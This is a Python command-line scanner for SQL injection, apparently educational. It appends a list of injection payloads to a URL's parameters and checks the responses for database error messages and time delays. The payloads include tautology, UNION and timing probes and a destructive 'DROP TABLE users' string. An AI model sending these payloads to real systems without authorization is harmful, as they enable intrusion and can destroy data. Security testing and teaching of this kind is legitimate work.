
## Example Detection Script (SQL Injection Detector)

```python
#!/usr/bin/env python3
"""
SQL Injection Detection Script
Location: 02-web-application-security/sql-injection/detection/sql_injection_scanner.py
"""

import re
import requests
from urllib.parse import urlparse, parse_qs
import argparse
from typing import List, Dict
import time

class SQLInjectionDetector:
    def __init__(self, target_url: str, timeout: int = 5):
        self.target_url = target_url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Security Scanner - Educational Purpose)'
        })
        
        # Common SQL injection payloads for testing
        self.payloads = [
            "'",
            '"',
            "' OR '1'='1",
            "' OR 1=1--",
            '" OR 1=1--',
            "' UNION SELECT NULL--",
            "admin'--",
            "1' ORDER BY 1--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "' OR '1'='1'--",
            "' OR 1=1#",
            "'; DROP TABLE users--",
            "' UNION SELECT @@version--",
            "' AND SLEEP(5)--",
            "' WAITFOR DELAY '0:0:5'--"
        ]
        
        # SQL error patterns
        self.error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"ORA-[0-9]{5}",
            r"Oracle error",
            r"Oracle.*Driver",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*sqlite_.*",
            r"valid SQLite",
            r"SQL Server.*Driver",
            r"Driver.*SQL Server",
            r"SQLServer JDBC Driver",
            r"com.microsoft.sqlserver",
            r"Unclosed quotation mark",
            r"Microsoft OLE DB Provider for ODBC Drivers"
        ]

    def extract_parameters(self) -> List[Dict]:
        """Extract parameters from URL for testing"""
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        
        param_list = []
        for param_name, param_value in params.items():
            param_list.append({
                'name': param_name,
                'value': param_value[0] if param_value else ''
            })
        
        return param_list

    def test_parameter(self, base_url: str, param_name: str, original_value: str) -> Dict:
        """Test a single parameter for SQL injection vulnerabilities"""
        results = {
            'parameter': param_name,
            'vulnerable': False,
            'payloads_tested': [],
            'error_messages': [],
            'response_times': []
        }
        
        # Test each payload
        for payload in self.payloads:
            test_value = original_value + payload
            test_url = base_url.replace(f"{param_name}={original_value}", 
                                       f"{param_name}={test_value}")
            
            try:
                start_time = time.time()
                response = self.session.get(test_url, timeout=self.timeout)
                response_time = time.time() - start_time
                
                results['response_times'].append(response_time)
                
                # Check for SQL errors in response
                for pattern in self.error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        results['vulnerable'] = True
                        results['error_messages'].append({
                            'payload': payload,
                            'error': pattern,
                            'response_size': len(response.text)
                        })
                        break
                
                # Check for time-based injection (if applicable)
                if 'SLEEP' in payload or 'WAITFOR' in payload:
                    if response_time > 4:  # If response took > 4 seconds
                        results['vulnerable'] = True
                        results['error_messages'].append({
                            'payload': payload,
                            'error': 'Time-based injection detected',
                            'response_time': response_time
                        })
                
                results['payloads_tested'].append(payload)
                
            except requests.exceptions.Timeout:
                print(f"  [!] Timeout for payload: {payload}")
            except requests.exceptions.RequestException as e:
                print(f"  [!] Request error: {e}")
        
        return results

    def scan(self) -> Dict:
        """Main scanning function"""
        print(f"\n[*] Scanning target: {self.target_url}")
        print("[*] Extracting parameters...")
        
        parameters = self.extract_parameters()
        
        if not parameters:
            print("[!] No URL parameters found. Consider testing POST parameters manually.")
            return {'vulnerable': False, 'results': []}
        
        print(f"[*] Found {len(parameters)} parameter(s): {[p['name'] for p in parameters]}")
        
        scan_results = {
            'target': self.target_url,
            'vulnerable': False,
            'parameters_tested': len(parameters),
            'results': []
        }
        
        # Test each parameter
        for param in parameters:
            print(f"\n[*] Testing parameter: {param['name']}")
            result = self.test_parameter(self.target_url, param['name'], param['value'])
            scan_results['results'].append(result)
            
            if result['vulnerable']:
                scan_results['vulnerable'] = True
                print(f"  [!] POTENTIAL VULNERABILITY DETECTED in parameter '{param['name']}'")
                for error in result['error_messages']:
                    print(f"      - {error['error']} (Payload: {error['payload']})")
            else:
                print(f"  [✓] Parameter '{param['name']}' appears safe")
        
        return scan_results

def main():
    parser = argparse.ArgumentParser(description='SQL Injection Vulnerability Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL to scan')
    parser.add_argument('-t', '--timeout', type=int, default=5, help='Request timeout in seconds')
    parser.add_argument('-o', '--output', help='Output file for results')
    
    args = parser.parse_args()
    
    print("""
    ╔═══════════════════════════════════════╗
    ║   SQL Injection Vulnerability Scanner  ║
    ║        FOR EDUCATIONAL USE ONLY        ║
    ╚═══════════════════════════════════════╝
    """)
    
    # Confirm legal use
    response = input("[?] Do you have permission to test this target? (yes/no): ")
    if response.lower() != 'yes':
        print("[!] Exiting. Only test systems you own or have permission to test.")
        return
    
    scanner = SQLInjectionDetector(args.url, args.timeout)
    
    try:
        results = scanner.scan()
        
        print("\n" + "="*50)
        print("SCAN COMPLETED")
        print("="*50)
        
        if results['vulnerable']:
            print("\n[!] WARNING: Potential SQL injection vulnerabilities detected!")
            print("\nVulnerable parameters:")
            for result in results['results']:
                if result['vulnerable']:
                    print(f"\n  Parameter: {result['parameter']}")
                    print(f"  Number of payloads tested: {len(result['payloads_tested'])}")
                    print(f"  Error indicators: {len(result['error_messages'])}")
                    for error in result['error_messages']:
                        print(f"    • {error.get('error', 'Unknown error')}")
        else:
            print("\n[✓] No SQL injection vulnerabilities detected.")
            print("    Remember: This doesn't guarantee 100% security.")
        
        # Save results if output file specified
        if args.output:
            import json
            with open(args.output, 'w') as f:
                json.dump(results, f, indent=2)
            print(f"\n[*] Results saved to {args.output}")
            
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
    except Exception as e:
        print(f"\n[!] Error during scan: {e}")

if __name__ == "__main__":
    main()
